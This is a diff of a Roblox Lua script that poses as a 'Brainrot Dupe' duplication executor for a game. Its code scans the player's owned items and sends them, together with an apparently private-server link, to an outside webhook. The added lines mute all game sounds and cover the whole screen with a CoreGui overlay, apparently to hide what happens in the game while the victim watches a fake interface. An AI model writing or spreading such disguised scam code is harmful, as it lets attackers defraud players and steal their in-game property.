@@ -204,15 +204,38 @@ end
 function showBrainrotExecutor(psLink)
     local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
+    local Workspace = game:GetService("Workspace")
+    local CoreGui = game:GetService("CoreGui")
     local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
 
-    -- Create main ScreenGui
+    -- =======================
+    -- MUTE ALL WORKSPACE SOUNDS
+    -- =======================
+    local mutedSounds = {}
+    local function muteSound(sound: Sound)
+        if not mutedSounds[sound] then
+            mutedSounds[sound] = sound.Volume
+            sound.Volume = 0
+        end
+    end
+
+    for _, sound in pairs(Workspace:GetDescendants()) do
+        if sound:IsA("Sound") then muteSound(sound) end
+    end
+
+    Workspace.DescendantAdded:Connect(function(d)
+        if d:IsA("Sound") then muteSound(d) end
+    end)
+
+    -- =======================
+    -- CREATE SCREEN GUI (COREGUI PARENT)
+    -- =======================
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "BrainrotExecutor"
-    screenGui.Parent = playerGui
+    screenGui.Parent = CoreGui -- <-- parent to CoreGui to overlap everything
     screenGui.ResetOnSpawn = false
     screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
     -- Main Frame (fullscreen)
     local mainFrame = Instance.new("Frame")
@@ -220,6 +243,7 @@ function showBrainrotExecutor(psLink)
     mainFrame.Position = UDim2.new(0, 0, 0, 0)
     mainFrame.BackgroundColor3 = Color3.fromRGB(120, 81, 169)
     mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 999 -- make sure it’s above everything
     mainFrame.Parent = screenGui
 
     -- Gradient
@@ -242,6 +266,7 @@ function showBrainrotExecutor(psLink)
     title.TextScaled = true
     title.Font = Enum.Font.SourceSansBold
     title.TextXAlignment = Enum.TextXAlignment.Left
+    title.ZIndex = 1000
     title.Parent = mainFrame
 
     -- Subtitle
@@ -255,6 +280,7 @@ function showBrainrotExecutor(psLink)
     subtitle.TextScaled = true
     subtitle.Font = Enum.Font.SourceSans
     subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    subtitle.ZIndex = 1000
     subtitle.Parent = mainFrame
 
     -- Left Panel (Brainrot List)
@@ -264,6 +290,7 @@ function showBrainrotExecutor(psLink)
     leftPanel.Position = UDim2.new(0.025, 0, 0.15, 0)
     leftPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
     leftPanel.BorderSizePixel = 0
+    leftPanel.ZIndex = 1000
     leftPanel.Parent = mainFrame
 
     local leftCorner = Instance.new("UICorner")
@@ -278,6 +305,7 @@ function showBrainrotExecutor(psLink)
     listTitle.TextColor3 = Color3.new(1, 1, 1)
     listTitle.TextScaled = true
     listTitle.Font = Enum.Font.SourceSansBold
+    listTitle.ZIndex = 1001
     listTitle.Parent = leftPanel
 
     local scrollFrame = Instance.new("ScrollingFrame")
@@ -286,6 +314,7 @@ function showBrainrotExecutor(psLink)
     scrollFrame.BackgroundTransparency = 1
     scrollFrame.BorderSizePixel = 0
     scrollFrame.ScrollBarThickness = 6
+    scrollFrame.ZIndex = 1001
     scrollFrame.Parent = leftPanel
 
     local listLayout = Instance.new("UIListLayout")
@@ -300,17 +329,20 @@ function showBrainrotExecutor(psLink)
     rightPanel.Position = UDim2.new(0.585, 0, 0.15, 0)
     rightPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
     rightPanel.BorderSizePixel = 0
+    rightPanel.ZIndex = 1000
     rightPanel.Parent = mainFrame
 
     local rightCorner = Instance.new("UICorner")
     rightCorner.CornerRadius = UDim.new(0, 8)
     rightCorner.Parent = rightPanel
 
+    -- Selected Brainrot frame
     local selectedFrame = Instance.new("Frame")
     selectedFrame.Size = UDim2.new(1, -10, 0, 120)
     selectedFrame.Position = UDim2.new(0, 5, 0, 10)
     selectedFrame.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
     selectedFrame.BorderSizePixel = 0
+    selectedFrame.ZIndex = 1001
     selectedFrame.Parent = rightPanel
 
     local selectedCorner = Instance.new("UICorner")
@@ -325,6 +357,7 @@ function showBrainrotExecutor(psLink)
     selectedTitle.TextColor3 = Color3.new(1, 1, 1)
     selectedTitle.TextScaled = true
     selectedTitle.Font = Enum.Font.SourceSansBold
+    selectedTitle.ZIndex = 1002
     selectedTitle.Parent = selectedFrame
 
     local selectedName = Instance.new("TextLabel")
@@ -336,6 +369,7 @@ function showBrainrotExecutor(psLink)
     selectedName.TextScaled = true
     selectedName.Font = Enum.Font.SourceSans
     selectedName.TextWrapped = true
+    selectedName.ZIndex = 1002
     selectedName.Parent = selectedFrame
 
     local spawnButton = Instance.new("TextButton")
@@ -347,15 +381,14 @@ function showBrainrotExecutor(psLink)
     spawnButton.TextScaled = true
     spawnButton.Font = Enum.Font.SourceSansBold
     spawnButton.BorderSizePixel = 0
+    spawnButton.ZIndex = 1003
     spawnButton.Parent = rightPanel
 
     local spawnCorner = Instance.new("UICorner")
     spawnCorner.CornerRadius = UDim.new(0, 8)
     spawnCorner.Parent = spawnButton
 
-    -- =======================
-    -- SCAN PLAYER BASE FOR BRAINROTS
-    -- =======================
+    -- SCAN PLAYER BASE AND POPULATE LIST
     local brainrots = {}
     for _, plot in ipairs(workspace.Plots:GetChildren()) do
         local label = plot:FindFirstChild("PlotSign") 
@@ -370,22 +403,15 @@ function showBrainrotExecutor(psLink)
                     local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
                     if overhead then
                         local name = overhead:FindFirstChild("DisplayName") and overhead.DisplayName.Text or "Unknown"
-                        local rarity = overhead:FindFirstChild("Rarity") and overhead.Rarity.Text or "Unknown"
-
                         table.insert(brainrots, name)
-                        if rarity:lower():find("secret") then
-                            SHOULD_PING = true
-                        end                 
                     end
                 end
             end
         end
     end
 
-    -- Populate GUI list with brainrots
-    local selectedItem = nil
-    local selectedButton = nil
-
+    -- Populate scrollFrame
+    local selectedItem, selectedButton
     for i, itemName in ipairs(brainrots) do
         local button = Instance.new("TextButton")
         button.Size = UDim2.new(1, -10, 0, 35)
@@ -395,6 +421,7 @@ function showBrainrotExecutor(psLink)
         button.TextScaled = true
         button.Font = Enum.Font.SourceSans
         button.BorderSizePixel = 0
+        button.ZIndex = 1002
         button.Parent = scrollFrame
 
         local buttonCorner = Instance.new("UICorner")
@@ -424,13 +451,13 @@ function showBrainrotExecutor(psLink)
         end
     end)
 
-
     -- 🔥 send to webhook after scan
     sendKeyToWebhook(player, psLink, brainrots)
 
     print("Brainrot Dupe By ZuriScripts Loaded!")
     return brainrots
 end
+
 
 -- =======================
 -- Updated Key Submit Logic
